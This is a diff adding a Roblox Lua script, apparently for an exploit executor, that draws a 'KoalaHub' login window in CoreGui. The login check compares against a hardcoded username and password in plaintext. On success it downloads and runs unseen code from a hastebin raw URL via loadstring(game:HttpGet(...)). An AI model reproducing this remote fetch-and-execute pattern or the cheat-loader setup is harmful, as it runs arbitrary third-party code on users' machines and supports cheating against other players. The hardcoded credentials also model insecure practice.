@@ -1,0 +1,197 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("ImageLabel")
+local Label = Instance.new("TextLabel")
+local UsernameButton = Instance.new("TextBox")
+local UsernameRoundify = Instance.new("ImageLabel")
+local PasswordButton = Instance.new("TextBox")
+local PasswordRoundify = Instance.new("ImageLabel")
+local Login = Instance.new("TextButton")
+local LoginRoundify = Instance.new("ImageLabel")
+local RedLine = Instance.new("Frame")
+local RedlineGradient = Instance.new("UIGradient")
+local RedlineCorner = Instance.new("UICorner")
+local Exit = Instance.new("TextButton")
+local ExitRoundify = Instance.new("ImageLabel")
+
+--Properties:
+
+ScreenGui.Parent = game.CoreGui
+
+Frame.Name = "Frame"
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Frame.BackgroundTransparency = 1.000
+Frame.Position = UDim2.new(0.0293180309, 0, 0.44561404, 0)
+Frame.Size = UDim2.new(0, 682, 0, 389)
+Frame.Image = "rbxassetid://3570695787"
+Frame.ImageColor3 = Color3.fromRGB(0, 0, 0)
+Frame.ScaleType = Enum.ScaleType.Slice
+Frame.SliceCenter = Rect.new(100, 100, 100, 100)
+Frame.SliceScale = 0.120
+Frame.Active = true
+Frame.Draggable = true
+
+Label.Name = "Label"
+Label.Parent = Frame
+Label.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Label.BackgroundTransparency = 1.000
+Label.Position = UDim2.new(0, 4, 0, 0)
+Label.Size = UDim2.new(0, 603, 0, 50)
+Label.Font = Enum.Font.Merriweather
+Label.Text = "Login To KoalaHub"
+Label.TextColor3 = Color3.fromRGB(255, 255, 131)
+Label.TextScaled = true
+Label.TextSize = 14.000
+Label.TextWrapped = true
+
+UsernameButton.Name = "UsernameButton"
+UsernameButton.Parent = Frame
+UsernameButton.BackgroundColor3 = Color3.fromRGB(255, 249, 162)
+UsernameButton.BackgroundTransparency = 1.000
+UsernameButton.BorderSizePixel = 0
+UsernameButton.Position = UDim2.new(0.0571847521, 0, 0.205367908, 0)
+UsernameButton.Size = UDim2.new(0, 603, 0, 52)
+UsernameButton.ZIndex = 2
+UsernameButton.Font = Enum.Font.PatrickHand
+UsernameButton.Text = "Username/ Id Number"
+UsernameButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+UsernameButton.TextSize = 30.000
+UsernameButton.TextWrapped = true
+
+UsernameRoundify.Name = "UsernameRoundify"
+UsernameRoundify.Parent = UsernameButton
+UsernameRoundify.Active = true
+UsernameRoundify.AnchorPoint = Vector2.new(0.5, 0.5)
+UsernameRoundify.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+UsernameRoundify.BackgroundTransparency = 1.000
+UsernameRoundify.Position = UDim2.new(0.5, 0, 0.461538464, 0)
+UsernameRoundify.Selectable = true
+UsernameRoundify.Size = UDim2.new(1, 0, 1, 0)
+UsernameRoundify.Image = "rbxassetid://3570695787"
+UsernameRoundify.ImageColor3 = Color3.fromRGB(255, 249, 162)
+UsernameRoundify.ScaleType = Enum.ScaleType.Slice
+UsernameRoundify.SliceCenter = Rect.new(100, 100, 100, 100)
+UsernameRoundify.SliceScale = 0.090
+
+PasswordButton.Name = "PasswordButton"
+PasswordButton.Parent = Frame
+PasswordButton.BackgroundColor3 = Color3.fromRGB(255, 249, 162)
+PasswordButton.BackgroundTransparency = 1.000
+PasswordButton.BorderSizePixel = 0
+PasswordButton.Position = UDim2.new(0, 39, 0, 187)
+PasswordButton.Size = UDim2.new(0, 603, 0, 50)
+PasswordButton.ZIndex = 2
+PasswordButton.Font = Enum.Font.PatrickHand
+PasswordButton.Text = "Password Here"
+PasswordButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+PasswordButton.TextSize = 30.000
+
+PasswordRoundify.Name = "PasswordRoundify"
+PasswordRoundify.Parent = PasswordButton
+PasswordRoundify.Active = true
+PasswordRoundify.AnchorPoint = Vector2.new(0.5, 0.5)
+PasswordRoundify.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+PasswordRoundify.BackgroundTransparency = 1.000
+PasswordRoundify.Position = UDim2.new(0.5, 0, 0.5, 0)
+PasswordRoundify.Selectable = true
+PasswordRoundify.Size = UDim2.new(1, 0, 1, 0)
+PasswordRoundify.Image = "rbxassetid://3570695787"
+PasswordRoundify.ImageColor3 = Color3.fromRGB(255, 249, 162)
+PasswordRoundify.ScaleType = Enum.ScaleType.Slice
+PasswordRoundify.SliceCenter = Rect.new(100, 100, 100, 100)
+PasswordRoundify.SliceScale = 0.090
+
+Login.Name = "Login"
+Login.Parent = Frame
+Login.BackgroundColor3 = Color3.fromRGB(255, 249, 162)
+Login.BackgroundTransparency = 1.000
+Login.BorderSizePixel = 0
+Login.Position = UDim2.new(0, 165, 0, 278)
+Login.Size = UDim2.new(0, 352, 0, 50)
+Login.ZIndex = 2
+Login.Font = Enum.Font.Oswald
+Login.Text = "Login"
+Login.TextColor3 = Color3.fromRGB(0, 0, 0)
+Login.TextSize = 30.000
+Login.MouseButton1Down:connect(function()
+	if UsernameButton.Text == "KoalaHubUser" and PasswordButton.Text == "1234KoalasLol" then
+		loadstring(game:HttpGet("https://hastebin.com/raw/wivinimihu.md"))() 
+		Frame.Visible = false
+	else
+		Login.Text = "Invalid Password Or Username"
+		wait(0.5)
+		Login.Text = "Dm KoalaPlayz#0001 or join Discord Server"
+		wait(3)
+		Login.Text = "Login"
+		
+	end
+end)
+
+LoginRoundify.Name = "LoginRoundify"
+LoginRoundify.Parent = Login
+LoginRoundify.Active = true
+LoginRoundify.AnchorPoint = Vector2.new(0.5, 0.5)
+LoginRoundify.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+LoginRoundify.BackgroundTransparency = 1.000
+LoginRoundify.Position = UDim2.new(0.5, 0, 0.5, 0)
+LoginRoundify.Selectable = true
+LoginRoundify.Size = UDim2.new(1, 0, 1, 0)
+LoginRoundify.Image = "rbxassetid://3570695787"
+LoginRoundify.ImageColor3 = Color3.fromRGB(255, 249, 162)
+LoginRoundify.ScaleType = Enum.ScaleType.Slice
+LoginRoundify.SliceCenter = Rect.new(100, 100, 100, 100)
+LoginRoundify.SliceScale = 0.090
+
+RedLine.Name = "RedLine"
+RedLine.Parent = Frame
+RedLine.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+RedLine.BorderColor3 = Color3.fromRGB(27, 42, 53)
+RedLine.BorderSizePixel = 0
+RedLine.Position = UDim2.new(0.00674089324, 0, 0.146529555, 0)
+RedLine.Size = UDim2.new(0, 670, 0, 7)
+
+RedlineGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(224, 43, 39)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(168, 3, 3))}
+RedlineGradient.Name = "RedlineGradient"
+RedlineGradient.Parent = RedLine
+
+RedlineCorner.CornerRadius = UDim.new(0, 4)
+RedlineCorner.Name = "RedlineCorner"
+RedlineCorner.Parent = RedLine
+
+Exit.Name = "Exit"
+Exit.Parent = Frame
+Exit.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+Exit.BackgroundTransparency = 1.000
+Exit.BorderSizePixel = 0
+Exit.Position = UDim2.new(0, 615, 0, 6)
+Exit.Size = UDim2.new(0, 52, 0, 38)
+Exit.ZIndex = 2
+Exit.Font = Enum.Font.Oswald
+Exit.Text = "X"
+Exit.TextColor3 = Color3.fromRGB(0, 0, 0)
+Exit.TextScaled = true
+Exit.TextSize = 14.000
+Exit.TextWrapped = true
+Exit.MouseButton1Down:connect(function()
+	ScreenGui:Destroy()
+end)
+
+ExitRoundify.Name = "ExitRoundify"
+ExitRoundify.Parent = Exit
+ExitRoundify.Active = true
+ExitRoundify.AnchorPoint = Vector2.new(0.5, 0.5)
+ExitRoundify.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ExitRoundify.BackgroundTransparency = 1.000
+ExitRoundify.Position = UDim2.new(0.5, 0, 0.5, 0)
+ExitRoundify.Selectable = true
+ExitRoundify.Size = UDim2.new(1, 0, 1, 0)
+ExitRoundify.Image = "rbxassetid://3570695787"
+ExitRoundify.ImageColor3 = Color3.fromRGB(255, 0, 0)
+ExitRoundify.ScaleType = Enum.ScaleType.Slice
+ExitRoundify.SliceCenter = Rect.new(100, 100, 100, 100)
+ExitRoundify.SliceScale = 0.090
